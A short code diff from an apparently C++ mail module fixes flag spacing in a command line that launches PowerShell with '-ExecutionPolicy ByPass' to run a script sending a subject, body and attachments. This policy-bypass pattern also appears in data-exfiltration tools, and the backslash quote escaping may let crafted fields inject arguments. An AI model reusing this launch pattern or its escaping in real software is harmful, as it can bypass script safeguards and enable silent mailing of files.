@@ -113,11 +113,11 @@ namespace Mail
         if(!ok)
             return -2;
 
-        std::string param = "-ExecutionPolicy ByPass -File \"" + scr_path + "\" - Subj \""
+        std::string param = "-ExecutionPolicy ByPass -File \"" + scr_path + "\" -Subj \""
                             + StringReplace(subject, "\"", "\\\"") +
-                            "\" - Body \""
+                            "\" -Body \""
                             + StringReplace(body, "\"", "\\\"") +
-                            "\" - Att \"" + attachments + "\"";
+                            "\" -Att \"" + attachments + "\"";
         //Execute Script
         SHELLEXECUTEINFO ShExecInfo = {0};
         ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
